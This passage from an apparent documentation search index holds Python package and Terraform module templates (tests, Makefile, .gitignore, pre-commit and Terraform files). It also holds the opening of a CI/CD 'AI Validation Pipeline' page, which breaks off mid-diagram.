         config = yaml.safe_load(f)\n    except yaml.YAMLError as e:\n        raise ValueError(f\"Invalid YAML in config file: {e}\")\n\n    return config or {}\n\ndef validate_input(data: Any) -&gt; bool:\n    \"\"\"Validate input data.\n\n    Args:\n        data: Data to validate\n\n    Returns:\n        True if valid, False otherwise\n    \"\"\"\n    if data is None:\n        return False\n\n    if isinstance(data, str) and not data.strip():\n        return False\n\n    return True\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#testsconftestpy-template","title":"tests/conftest.py Template","text":"<pre><code>\"\"\"Pytest configuration and fixtures.\"\"\"\n\nfrom pathlib import Path\nfrom typing import Generator\n\nimport pytest\n\n@pytest.fixture\ndef sample_data() -&gt; dict[str, str]:\n    \"\"\"Provide sample data for tests.\n\n    Returns:\n        Sample data dictionary\n    \"\"\"\n    return {\n        \"key1\": \"value1\",\n        \"key2\": \"value2\",\n    }\n\n@pytest.fixture\ndef temp_file(tmp_path: Path) -&gt; Generator[Path, None, None]:\n    \"\"\"Create a temporary file for testing.\n\n    Args:\n        tmp_path: Pytest temporary directory fixture\n\n    Yields:\n        Path to temporary file\n    \"\"\"\n    file_path = tmp_path / \"test_file.txt\"\n    file_path.write_text(\"test content\")\n\n    yield file_path\n\n    # Cleanup handled by tmp_path\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#teststest_corepy-template","title":"tests/test_core.py Template","text":"<pre><code>\"\"\"Tests for core functionality.\"\"\"\n\nfrom pathlib import Path\n\nimport pytest\n\nfrom my_package.core import MyClass, process_data\n\nclass TestMyClass:\n    \"\"\"Tests for MyClass.\"\"\"\n\n    def test_init_with_config(self, sample_data: dict[str, str]) -&gt; None:\n        \"\"\"Test initialization with configuration.\"\"\"\n        obj = MyClass(config=sample_data)\n        assert obj.config == sample_data\n\n    def test_init_without_config(self) -&gt; None:\n        \"\"\"Test initialization without configuration.\"\"\"\n        obj = MyClass()\n        assert obj.config == {}\n\n    def test_do_something_with_config(self, sample_data: dict[str, str]) -&gt; None:\n        \"\"\"Test do_something with valid configuration.\"\"\"\n        obj = MyClass(config=sample_data)\n        result = obj.do_something()\n        assert isinstance(result, str)\n\n    def test_do_something_without_config(self) -&gt; None:\n        \"\"\"Test do_something raises ValueError without config.\"\"\"\n        obj = MyClass()\n        with pytest.raises(ValueError, match=\"Configuration is required\"):\n            obj.do_something()\n\nclass TestProcessData:\n    \"\"\"Tests for process_data function.\"\"\"\n\n    def test_process_data_valid_file(self, temp_file: Path) -&gt; None:\n        \"\"\"Test processing a valid file.\"\"\"\n        result = process_data(temp_file)\n        assert result == \"TEST CONTENT\"\n\n    def test_process_data_missing_file(self) -&gt; None:\n        \"\"\"Test processing raises FileNotFoundError for missing file.\"\"\"\n        with pytest.raises(FileNotFoundError):\n            process_data(Path(\"nonexistent.txt\"))\n\n    def test_process_data_empty_file(self, tmp_path: Path) -&gt; None:\n        \"\"\"Test processing raises ValueError for empty file.\"\"\"\n        empty_file = tmp_path / \"empty.txt\"\n        empty_file.write_text(\"\")\n\n        with pytest.raises(ValueError, match=\"Input file is empty\"):\n            process_data(empty_file)\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#gitignore-template","title":".gitignore Template","text":"<pre><code>## Byte-compiled / optimized / DLL files\n__pycache__/\n*.py[cod]\n*$py.class\n\n## C extensions\n*.so\n\n## Distribution / packaging\n.Python\nbuild/\ndevelop-eggs/\ndist/\ndownloads/\neggs/\n.eggs/\nlib/\nlib64/\nparts/\nsdist/\nvar/\nwheels/\npip-wheel-metadata/\nshare/python-wheels/\n*.egg-info/\n.installed.cfg\n*.egg\nMANIFEST\n\n## PyInstaller\n*.manifest\n*.spec\n\n## Unit test / coverage reports\nhtmlcov/\n.tox/\n.nox/\n.coverage\n.coverage.*\n.cache\nnosetests.xml\ncoverage.xml\n*.cover\n*.py,cover\n.hypothesis/\n.pytest_cache/\n\n## Translations\n*.mo\n*.pot\n\n## Django\n*.log\nlocal_settings.py\ndb.sqlite3\ndb.sqlite3-journal\n\n## Flask\ninstance/\n.webassets-cache\n\n## Scrapy\n.scrapy\n\n## Sphinx documentation\ndocs/_build/\n\n## PyBuilder\ntarget/\n\n## Jupyter Notebook\n.ipynb_checkpoints\n\n## IPython\nprofile_default/\nipython_config.py\n\n## pyenv\n.python-version\n\n## pipenv\nPipfile.lock\n\n## PEP 582\n__pypackages__/\n\n## Celery\ncelerybeat-schedule\ncelerybeat.pid\n\n## SageMath\n*.sage.py\n\n## Environments\n.env\n.venv\nenv/\nvenv/\nENV/\nenv.bak/\nvenv.bak/\n\n## Spyder\n.spyderproject\n.spyproject\n\n## Rope\n.ropeproject\n\n## mkdocs\n/site\n\n## mypy\n.mypy_cache/\n.dmypy.json\ndmypy.json\n\n## Pyre\n.pyre/\n\n## IDEs\n.vscode/\n.idea/\n*.swp\n*.swo\n*~\n\n## OS\n.DS_Store\nThumbs.db\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#pre-commit-configyaml-template","title":".pre-commit-config.yaml Template","text":"<pre><code>repos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.4.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n      - id: check-toml\n      - id: check-merge-conflict\n      - id: debug-statements\n\n  - repo: https://github.com/psf/black\n    rev: 23.7.0\n    hooks:\n      - id: black\n        language_version: python3.10\n\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.0.280\n    hooks:\n      - id: ruff\n        args: [--fix, --exit-non-zero-on-fix]\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.4.1\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-all]\n        args: [--strict]\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#makefile-template","title":"Makefile Template","text":"<pre><code>.PHONY: help install dev test lint format clean build publish\n\nhelp: ## Show this help message\n @grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \\\n  awk 'BEGIN {FS = \":.*?## \"}; {printf \"\\033[36m%-20s\\033[0m %s\\n\", $$1, $$2}'\n\ninstall: ## Install package\n pip install -e .\n\ndev: ## Install package with development dependencies\n pip install -e \".[dev,docs]\"\n\ntest: ## Run tests\n pytest\n\ntest-cov: ## Run tests with coverage report\n pytest --cov --cov-report=html --cov-report=term\n\nlint: ## Run linters\n ruff check src tests\n mypy src\n\nformat: ## Format code\n black src tests\n ruff check --fix src tests\n\nclean: ## Clean build artifacts\n rm -rf build dist *.egg-info\n rm -rf .pytest_cache .coverage htmlcov\n find . -type d -name __pycache__ -exec rm -rf {} +\n find . -type f -name \"*.pyc\" -delete\n\nbuild: clean ## Build distribution\n python -m build\n\npublish: build ## Publish to PyPI\n python -m twine upload dist/*\n\ndocs-serve: ## Serve documentation locally\n mkdocs serve\n\ndocs-build: ## Build documentation\n mkdocs build\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#best-practices","title":"Best Practices","text":"","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#package-naming","title":"Package Naming","text":"<ul> <li>Use lowercase with hyphens for PyPI: <code>my-package</code></li> <li>Use underscores for Python imports: <code>my_package</code></li> <li>Choose descriptive, unique names</li> </ul>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#version-management","title":"Version Management","text":"<ul> <li>Follow Semantic Versioning</li> <li>Use <code>__version__</code> in <code>__init__.py</code></li> <li>Keep version in sync with git tags</li> </ul>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#type-hints","title":"Type Hints","text":"<ul> <li>Use type hints for all public APIs</li> <li>Include <code>py.typed</code> marker for type checking</li> <li>Configure mypy in <code>pyproject.toml</code></li> </ul>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#testing","title":"Testing","text":"<ul> <li>Aim for &gt;90% code coverage</li> <li>Use fixtures for common test data</li> <li>Test edge cases and error conditions</li> </ul>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#documentation","title":"Documentation","text":"<ul> <li>Write clear docstrings (Google style)</li> <li>Include usage examples in README</li> <li>Use mkdocs for comprehensive docs</li> </ul>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#references","title":"References","text":"","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Python Packaging Guide</li> <li>PEP 517 - Build System</li> <li>PEP 518 - pyproject.toml</li> <li>setuptools Documentation</li> </ul>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#tools","title":"Tools","text":"<ul> <li>pytest - Testing framework</li> <li>black - Code formatter</li> <li>ruff - Fast Python linter</li> <li>mypy - Static type checker</li> <li>pre-commit - Git hooks</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["python","package","template","pyproject"]},{"location":"04_templates/terraform_module_template/","title":"Terraform Module Template","text":"","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#overview","title":"Overview","text":"<p>This template provides a complete structure for creating reusable, well-documented Terraform modules following industry best practices. Use this as a starting point for building modules that are maintainable, testable, and easy to consume.</p>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#module-structure","title":"Module Structure","text":"<pre><code>terraform-&lt;provider&gt;-&lt;name&gt;/\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 main.tf\n\u251c\u2500\u2500 variables.tf\n\u251c\u2500\u2500 outputs.tf\n\u251c\u2500\u2500 versions.tf\n\u251c\u2500\u2500 examples/\n\u2502   \u251c\u2500\u2500 simple/\n\u2502   \u2502   \u251c\u2500\u2500 main.tf\n\u2502   \u2502   \u251c\u2500\u2500 variables.tf\n\u2502   \u2502   \u251c\u2500\u2500 outputs.tf\n\u2502   \u2502   \u2514\u2500\u2500 README.md\n\u2502   \u2514\u2500\u2500 complete/\n\u2502       \u251c\u2500\u2500 main.tf\n\u2502       \u251c\u2500\u2500 variables.tf\n\u2502       \u251c\u2500\u2500 outputs.tf\n\u2502       \u2514\u2500\u2500 README.md\n\u251c\u2500\u2500 test/\n\u2502   \u2514\u2500\u2500 module_test.go\n\u2514\u2500\u2500 .gitignore\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#readmemd-template","title":"README.md Template","text":"<pre><code>## Terraform [Provider] [Resource Name] Module\n\nTerraform module for creating and managing [resource description].\n\n## Usage\n\n### Simple Example\n\n\\```hcl\nmodule \"example\" {\n  source = \"github.com/your-org/terraform-aws-example\"\n\n  name        = \"my-resource\"\n  environment = \"production\"\n\n  tags = {\n    Project = \"my-project\"\n  }\n}\n\\```\n\n### Complete Example\n\n\\```hcl\nmodule \"example\" {\n  source = \"github.com/your-org/terraform-aws-example\"\n\n  name        = \"my-resource\"\n  environment = \"production\"\n\n  # Advanced configuration\n  enable_monitoring = true\n  retention_days    = 30\n\n  tags = {\n    Project   = \"my-project\"\n    ManagedBy = \"Terraform\"\n  }\n}\n\\```\n\n## Requirements\n\n| Name | Version |\n|------|---------|\n| terraform | &gt;= 1.0 |\n| aws | &gt;= 5.0 |\n\n## Providers\n\n| Name | Version |\n|------|---------|\n| aws | &gt;= 5.0 |\n\n## Modules\n\nNo modules.\n\n## Resources\n\n| Name | Type |\n|------|------|\n| [aws_example_resource.this][aws_example_resource] | resource |\n\n[aws_example_resource]: https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/example_resource\n\n## Inputs\n\n| Name | Description | Type | Default | Required |\n|------|-------------|------|---------|:--------:|\n| name | Name of the resource | `string` | n/a | yes |\n| environment | Environment name | `string` | n/a | yes |\n| tags | Tags to apply to resources | `map(string)` | `{}` | no |\n\n## Outputs\n\n| Name | Description |\n|------|-------------|\n| id | The ID of the resource |\n| arn | The ARN of the resource |\n\n## Examples\n\nSee the [examples](./examples) directory for working examples.\n\n## Testing\n\nThis module uses [Terratest](https://terratest.gruntwork.io/) for automated testing.\n\n\\```bash\ncd test\ngo test -v -timeout 30m\n\\```\n\n## Contributing\n\nContributions are welcome! Please open an issue or submit a pull request.\n\n## License\n\nApache 2.0 Licensed. See LICENSE for full details.\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#maintf-template","title":"main.tf Template","text":"<pre><code>## Main resource definitions\nresource \"aws_example_resource\" \"this\" {\n  name = var.name\n\n  # Configuration\n  enabled = var.enabled\n  size    = var.size\n\n  # Metadata\n  tags = merge(\n    var.tags,\n    {\n      Name        = var.name\n      Environment = var.environment\n      ManagedBy   = \"Terraform\"\n    }\n  )\n}\n\n## Supporting resources\nresource \"aws_example_policy\" \"this\" {\n  count = var.enable_policy ? 1 : 0\n\n  name        = \"${var.name}-policy\"\n  description = \"Policy for ${var.name}\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"logs:CreateLogGroup\",\n          \"logs:CreateLogStream\",\n          \"logs:PutLogEvents\"\n        ]\n        Resource = \"arn:aws:logs:*:*:*\"\n      }\n    ]\n  })\n\n  tags = var.tags\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#variablestf-template","title":"variables.tf Template","text":"<pre><code>## Required variables\nvariable \"name\" {\n  description = \"Name of the resource. Used for resource naming and tagging.\"\n  type        = string\n\n  validation {\n    condition     = length(var.name) &gt; 0 &amp;&amp; length(var.name) &lt;= 64\n    error_message = \"Name must be between 1 and 64 characters.\"\n  }\n}\n\nvariable \"environment\" {\n  description = \"Environment name (e.g., dev, staging, production).\"\n  type        = string\n\n  validation {\n    condition     = contains([\"dev\", \"staging\", \"production\"], var.environment)\n    error_message = \"Environment must be dev, staging, or production.\"\n  }\n}\n\n## Optional variables with defaults\nvariable \"enabled\" {\n  description = \"Whether the resource is enabled.\"\n  type        = bool\n  default     = true\n}\n\nvariable \"size\" {\n  description = \"Size of the resource.\"\n  type        = string\n  default     = \"small\"\n\n  validation {\n    condition     = contains([\"small\", \"medium\", \"large\"], var.size)\n    error_message = \"Size must be small, medium, or large.\"\n  }\n}\n\nvariable \"enable_policy\" {\n  description = \"Whether to create an IAM policy.\"\n  type        = bool\n  default     = false\n}\n\nvariable \"retention_days\" {\n  description = \"Number of days to retain logs.\"\n  type        = number\n  default     = 7\n\n  validation {\n    condition     = var.retention_days &gt; 0\n    error_message = \"Retention days must be positive.\"\n  }\n}\n\n## Complex variables\nvariable \"network_config\" {\n  description = \"Network configuration for the resource.\"\n  type = object({\n    vpc_id             = string\n    subnet_ids         = list(string)\n    security_group_ids = list(string)\n  })\n  default = null\n}\n\n## Tags\nvariable \"tags\" {\n  description = \"A map of tags to add to all resources.\"\n  type        = map(string)\n  default     = {}\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#outputstf-template","title":"outputs.tf Template","text":"<pre><code>## Primary outputs\noutput \"id\" {\n  description = \"The ID of the resource.\"\n  value       = aws_example_resource.this.id\n}\n\noutput \"arn\" {\n  description = \"The ARN of the resource.\"\n  value       = aws_example_resource.this.arn\n}\n\noutput \"name\" {\n  description = \"The name of the resource.\"\n  value       = aws_example_resource.this.name\n}\n\n## Conditional outputs\noutput \"policy_arn\" {\n  description = \"The ARN of the IAM policy (if enabled).\"\n  value       = var.enable_policy ? aws_example_policy.this[0].arn : null\n}\n\n## Complex outputs\noutput \"endpoint\" {\n  description = \"Endpoint information for the resource.\"\n  value = {\n    url  = aws_example_resource.this.endpoint\n    port = aws_example_resource.this.port\n  }\n}\n\n## Sensitive outputs\noutput \"credentials\" {\n  description = \"Credentials for accessing the resource.\"\n  value = {\n    username = aws_example_resource.this.username\n    password = aws_example_resource.this.password\n  }\n  sensitive = true\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#versionstf-template","title":"versions.tf Template","text":"<pre><code>terraform {\n  required_version = \"&gt;= 1.0\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \"&gt;= 5.0\"\n    }\n  }\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#examplessimplemaintf-template","title":"examples/simple/main.tf Template","text":"<pre><code>provider \"aws\" {\n  region = \"us-east-1\"\n}\n\nmodule \"example\" {\n  source = \"../../\"\n\n  name        = \"simple-example\"\n  environment = \"dev\"\n\n  tags = {\n    Example = \"simple\"\n    Purpose = \"testing\"\n  }\n}\n\noutput \"resource_id\" {\n  description = \"The ID of the created resource.\"\n  value       = module.example.id\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#examplessimplevariablestf-template","title":"examples/simple/variables.tf Template","text":"<pre><code>variable \"aws_region\" {\n  description = \"AWS region to deploy resources.\"\n  type        = string\n  default     = \"us-east-1\"\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#examplescompletemaintf-template","title":"examples/complete/main.tf Template","text":"<pre><code>provider \"aws\" {\n  region = var.aws_region\n}\n\n## VPC for the example\nresource \"aws_vpc\" \"example\" {\n  cidr_block           = \"10.0.0.0/16\"\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  tags = {\n    Name    = \"example-vpc\"\n    Example = \"complete\"\n  }\n}\n\nresource \"aws_subnet\" \"example\" {\n  vpc_id            = aws_vpc.example.id\n  cidr_block        = \"10.0.1.0/24\"\n  availability_zone = data.aws_availability_zones.available.names[0]\n\n  tags = {\n    Name    = \"example-subnet\"\n    Example = \"complete\"\n  }\n}\n\ndata \"aws_availability_zones\" \"available\" {\n  state = \"available\"\n}\n\n## Complete module usage\nmodule \"example\" {\n  source = \"../../\"\n\n  name        = \"complete-example\"\n  environment = \"production\"\n\n  # Enable all features\n  enabled       = true\n  size          = \"large\"\n  enable_policy = true\n\n  # Network configuration\n  network_config = {\n    vpc_id             = aws_vpc.example.id\n    subnet_ids         = [aws_subnet.example.id]\n    security_group_ids = []\n  }\n\n  # Advanced settings\n  retention_days = 30\n\n  tags = {\n    Example   = \"complete\"\n    Purpose   = \"testing\"\n    ManagedBy = \"Terraform\"\n  }\n}\n\n## Outputs\noutput \"resource_id\" {\n  description = \"The ID of the created resource.\"\n  value       = module.example.id\n}\n\noutput \"resource_arn\" {\n  description = \"The ARN of the created resource.\"\n  value       = module.example.arn\n}\n\noutput \"endpoint\" {\n  description = \"The endpoint of the resource.\"\n  value       = module.example.endpoint\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#examplescompletevariablestf-template","title":"examples/complete/variables.tf Template","text":"<pre><code>variable \"aws_region\" {\n  description = \"AWS region to deploy resources.\"\n  type        = string\n  default     = \"us-east-1\"\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#testmodule_testgo-template","title":"test/module_test.go Template","text":"<pre><code>package test\n\nimport (\n \"testing\"\n\n \"github.com/gruntwork-io/terratest/modules/terraform\"\n \"github.com/stretchr/testify/assert\"\n)\n\nfunc TestTerraformModule(t *testing.T) {\n t.Parallel()\n\n terraformOptions := terraform.WithDefaultRetryableErrors(t, &amp;terraform.Options{\n  // Path to the Terraform code\n  TerraformDir: \"../examples/simple\",\n\n  // Variables to pass to the Terraform code\n  Vars: map[string]interface{}{\n   \"aws_region\": \"us-east-1\",\n  },\n\n  // Environment variables\n  EnvVars: map[string]string{\n   \"AWS_DEFAULT_REGION\": \"us-east-1\",\n  },\n })\n\n // Clean up resources at the end of the test\n defer terraform.Destroy(t, terraformOptions)\n\n // Deploy the infrastructure\n terraform.InitAndApply(t, terraformOptions)\n\n // Validate outputs\n resourceID := terraform.Output(t, terraformOptions, \"resource_id\")\n assert.NotEmpty(t, resourceID)\n}\n\nfunc TestTerraformModuleComplete(t *testing.T) {\n t.Parallel()\n\n terraformOptions := terraform.WithDefaultRetryableErrors(t, &amp;terraform.Options{\n  TerraformDir: \"../examples/complete\",\n\n  Vars: map[string]interface{}{\n   \"aws_region\": \"us-east-1\",\n  },\n\n  EnvVars: map[string]string{\n   \"AWS_DEFAULT_REGION\": \"us-east-1\",\n  },\n })\n\n defer terraform.Destroy(t, terraformOptions)\n\n terraform.InitAndApply(t, terraformOptions)\n\n // Test outputs\n resourceID := terraform.Output(t, terraformOptions, \"resource_id\")\n resourceARN := terraform.Output(t, terraformOptions, \"resource_arn\")\n\n assert.NotEmpty(t, resourceID)\n assert.NotEmpty(t, resourceARN)\n assert.Contains(t, resourceARN, \"arn:aws:\")\n}\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#gitignore-template","title":".gitignore Template","text":"<pre><code>## Local .terraform directories\n**/.terraform/*\n\n## .tfstate files\n*.tfstate\n*.tfstate.*\n\n## Crash log files\ncrash.log\ncrash.*.log\n\n## Exclude all .tfvars files\n*.tfvars\n*.tfvars.json\n\n## Ignore override files\noverride.tf\noverride.tf.json\n*_override.tf\n*_override.tf.json\n\n## Ignore CLI configuration files\n.terraformrc\nterraform.rc\n\n## Ignore lock files (commit for modules)\n## .terraform.lock.hcl\n\n## Test artifacts\ntest/.test-data\ntest/terraform.tfstate*\ntest/.terraform/*\n\n## IDE\n.idea\n.vscode\n*.swp\n*.swo\n*.bak\n*~\n\n## OS\n.DS_Store\nThumbs.db\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#best-practices","title":"Best Practices","text":"","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#module-naming","title":"Module Naming","text":"<pre><code>terraform-&lt;PROVIDER&gt;-&lt;NAME&gt;\n\nExamples:\n- terraform-aws-vpc\n- terraform-aws-ec2-instance\n- terraform-azure-storage-account\n- terraform-google-gke-cluster\n</code></pre>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#variable-ordering","title":"Variable Ordering","text":"<ol> <li>Required variables (no defaults)</li> <li>Optional variables (with defaults)</li> <li>Complex variables (objects, maps)</li> <li>Tags (always last)</li> </ol>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#output-naming","title":"Output Naming","text":"<p>Use descriptive, consistent output names:</p> <ul> <li><code>id</code> - Resource identifier</li> <li><code>arn</code> - Amazon Resource Name</li> <li><code>name</code> - Resource name</li> <li><code>endpoint</code> - Connection endpoint</li> <li><code>url</code> - Full URL</li> </ul>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#documentation","title":"Documentation","text":"<ul> <li>Always include a comprehensive README</li> <li>Use <code>terraform-docs</code> to auto-generate documentation</li> <li>Provide working examples for common use cases</li> <li>Include validation rules in variable descriptions</li> </ul>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#testing","title":"Testing","text":"<ul> <li>Test with Terratest or similar framework</li> <li>Include simple and complete examples</li> <li>Test in a separate AWS account</li> <li>Clean up resources after testing</li> </ul>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#references","title":"References","text":"","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Terraform Module Structure</li> <li>Terraform Registry Publishing</li> <li>Standard Module Structure</li> </ul>","tags":["terraform","module","template","infrastructure"]},{"location":"04_templates/terraform_module_template/#tools","title":"Tools","text":"<ul> <li>terraform-docs - Generate documentation</li> <li>Terratest - Automated testing</li> <li>tflint - Linting</li> <li>checkov - Security scanning</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["terraform","module","template","infrastructure"]},{"location":"05_ci_cd/ai_validation_pipeline/","title":"AI Validation Pipeline","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#overview","title":"Overview","text":"<p>The AI Validation Pipeline is a comprehensive, multi-stage validation system that combines traditional linting, testing, and static analysis with AI-powered code review and style checking. This pipeline ensures code quality, consistency, and adherence to style guides before code reaches production.</p>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#key-features","title":"Key Features","text":"<ul> <li>\u2705 Multi-Stage Validation: Pre-commit, CI, and post-merge validation stages</li> <li>\u2705 AI-Powered Review: Automated code review with contextual suggestions</li> <li>\u2705 Style Enforcement: Automatic detection of style guide violations</li> <li>\u2705 Security Scanning: Integrated security vulnerability detection</li> <li>\u2705 Metadata Validation: Ensures documentation frontmatter is complete and accurate</li> <li>\u2705 Performance Checks: Identifies performance anti-patterns</li> <li>\u2705 Platform Agnostic: Works with GitHub Actions, GitLab CI, Jenkins, and others</li> </ul>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#pipeline-architecture","title":"Pipeline Architecture","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#validation-stages","title":"Validation Stages","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Developer      \u2502\n\u2502  Local Machine  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Pre-commit     \u2502  \u2190 Stage 1: Local Validation\n\u2502  Hooks          \u2502     \u2022 Formatting (black, prettier, terraform fmt)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2022 Linting (eslint, flake8, shellcheck)\n         \u2502              \u2022 Security (detect-secrets)\n         \u2502              \u2022 Quick tests\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Git Push       \u2502\n\u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  CI Pipeline    \u2502  \u2190 Stage 2: Continuous Integration\n\u2502  (PR/MR)        \u2502     \u2022 Full test suite\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2022 Static analysis\n         \u2502              \u2022 Security scanning\n         \u2502              \u2022 AI code review\n         \u2502              \u2022 Style validation\n         \u25bc              \u2022 Terraform plan\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  AI Review Bot  \u2502  \u2190 Stage 3: AI Analysis\n\u2502                 \u2502     \u2022 Style suggestions\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2022 Anti-pattern detection\n         \u2502              \u2022 Best practice recommendations\n         \u2502              \u2022 Documentation review\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Human Review   \u2502  \u2190 Stage 4: Code Review\n\u2502  &amp; Approval     \u2502     \u2022 Manual review\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2022 Approval process\n         \u2502\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Merge to Main  \u2502\n\u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Post-Merge     \u2502  \u2190 Stage 5: Deployment Validation\n\u2502  Validation     \u2502     \u2022 Build verification\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2022 Deploy to staging\n         \u2502              \u2022 Smoke tests\n         \u25bc              \u2022 Performance tests\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Production     \u2502\n\u2502  Deployment     